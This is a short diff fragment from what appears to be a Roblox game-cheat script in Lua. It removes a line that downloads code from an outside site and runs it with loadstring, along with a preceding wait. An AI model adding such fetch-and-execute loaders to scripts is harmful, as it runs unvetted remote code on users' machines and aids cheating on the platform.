@@ -181,6 +181,3 @@ end
 else
 error("YOUR EXPLOIT IS NOT SUPPORTED!")
 end
-wait(10)
-
-loadstring(game:HttpGet('https://kidachi.xyz/Bloxfruit', true))()
